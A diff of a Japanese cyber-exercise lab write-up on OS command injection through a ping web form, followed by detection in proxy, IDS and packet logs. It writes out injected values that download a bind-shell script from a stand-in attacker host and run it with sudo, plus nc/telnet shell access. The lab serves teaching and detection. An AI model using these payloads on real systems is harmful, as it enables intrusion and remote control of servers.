@@ -76,11 +76,13 @@ Connection: close
 ```
 
 ## Steps
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/pingWEB.png" title="Screenshot">
+ht&#8203;tp://target.cyexc-target/アクセス時のスクリーンショット
 
-1. 不正なOSコマンドを含むリクエストを送信する    <br>
-	i. Bind Shellスクリプトは``8.8.8.8;wget http://attacker.cyexc-attacker:8081/bind_shell.py;chmod 777 bind_shell.py``と入力し、Attacker OSからTarget OSにダウンロードした。  <br>
- 	Attacker OSで、nmapを用いてTarget OSのポートスキャンすると、<br>
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/pingWEB.png" width=400 title="Screenshot">
+
+1. 不正なOSコマンドを含むリクエストを送信する。
+	i. Bind Shellスクリプトは`8.8.8.8;wget http://attacker.cyexc-attacker:8081/bind_shell.py;chmod 777 bind_shell.py`と入力し、Attacker OSからTarget OSにダウンロードした。  <br>
+ 	Attacker OSで、nmapを用いてTarget OSをポートスキャンする。この時点では、ポート443がOPENしていない。<br>
 	```
 	vagrant@attacker:~$ sudo nmap -sS target.cyexc-target
 
@@ -93,7 +95,8 @@ Connection: close
 	8080/tcp open  http-proxy
 	MAC Address: 08:00:27:83:ED:1B (Cadmus Computer Systems)
 	```
-	ii. ``8.8.8.8;echo 'cyexc' | sudo -S python bind_shell.py``のリクエスト送信でBind Shell起動する。  <br>
+	
+	ii. `8.8.8.8;echo 'cyexc' | sudo -S python bind_shell.py`のリクエスト送信でBind Shell起動する。  <br>
 	Attacker OSで、nmapを用いてTarget OSのポートスキャンすると、ポート443がOPENしていることがわかる。  <br>
 	```
 	vagrant@attacker:~$ sudo nmap -sS target.cyexc-target
@@ -108,30 +111,36 @@ Connection: close
 	8080/tcp open  http-proxy
 	MAC Address: 08:00:27:83:ED:1B (Cadmus Computer Systems)
 	```
+
 2. ncまたはtelnetを利用して、Attacker OSからTarget OSに接続し、Target OSのシェルを取得する。  <br>
 Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。  <br>
 以下はBind ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。  <br>
 
 * ncを使用した場合
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/nc.png" title="ncスクリーンショット">
+
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/nc.png" width=400 title="ncスクリーンショット">
 
 * telnetを使用した場合
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/telnet.png" title="telnetスクリーンショット">
+
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/telnet.png" width=400 title="telnetスクリーンショット">
 
 ### proxyサーバログの検知
-vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log<br>
+proxyサーバのログは`vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log`で取得した。
 
 [20/Jan/2018:14:09:20 +0000] **"GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1"** 200 842 **"ht&#8203;tp://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py"** "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
 
 URLエンコードすると、不正なOSコマンドを含むリクエストがわかる。
-```
+
+``
 vagrant@target:~$ echo '/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1" 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py"' | nkf -w --url-input
-**/getPage?host=8.8.8.8;wget+http://attacker.cyexc-attacker:8081/bind_shell.py;chmod+700+bind_shell.py HTTP/1.1" 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8;sudo+python+bind_shell.py"**
-```
-取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/ex1/logs/proxy.log)
+``
+
+**/getPage?host=8.8.8.8;wget+ht&#8203;tp://attacker.cyexc-attacker:8081/bind_shell.py;chmod+700+bind_shell.py HTTP/1.1" 200 842 "ht&#8203;tp://target.cyexc-target/getPage?host=8.8.8.8;sudo+python+bind_shell.py"**
+
+取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/ex2/logs/proxy.log)
 
 ### IDSログの検知
-vagrant@www:~/apps$ cp /var/log/suricata/fast.log .<br>
+IDSのログは`vagrant@www:~/apps$ cp /var/log/suricata/http.log .`で取得した。
 
 * 不審なTCPを受信  <br>
 01/20/2018-15:23:29.690006  [**] [1:2010937:2] ET POLICY Suspicious inbound to mySQL port 3306 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:3306  <br>
@@ -144,7 +153,8 @@ vagrant@www:~/apps$ cp /var/log/suricata/fast.log .<br>
 取得したログはこちら@[fast.log](https://github.com/CyExc/CyExc/blob/master/2017/ex2/logs/fast.log)
 
 ### proxyサーバでHTTP通信をキャプチャ
-実際にどのようなことが起きているのかは、WEBサーバのログで確認する。
+WEBサーバのログで事象を確認する。
+
 1. proxyサーバにログイン
 ```
 vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
@@ -167,13 +177,20 @@ CONTAINER ID        IMAGE                 COMMAND                  CREATED      
 vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .  
 ```
 
-+ 不審なリクエスト**ls　-l**  <br>
++ 不審なリクエスト**ls　-l**
+
+``
 T 192.168.1.100:42012 -> 192.168.1.10:8080 [AP]  <br>
 GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1  <br>
+``
 
-+ Target OSに設置されたWEBサーバが上記リクエストのレスポンスに　**ls -l**　のコマンド結果が含まれている。  <br>
++ Target OSに設置されたWEBサーバが上記リクエストのレスポンスに**ls -l**のコマンド結果が含まれている。
+
+``
 T 192.168.1.10:8080 -> 192.168.1.100:42012 [A]  <br>
 HTTP/1.1 200 OK.  <br>
+``
+
 ``
 PING 8.8.8.8 (8.8.8.8): 56 data bytes
 64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=33.850 ms
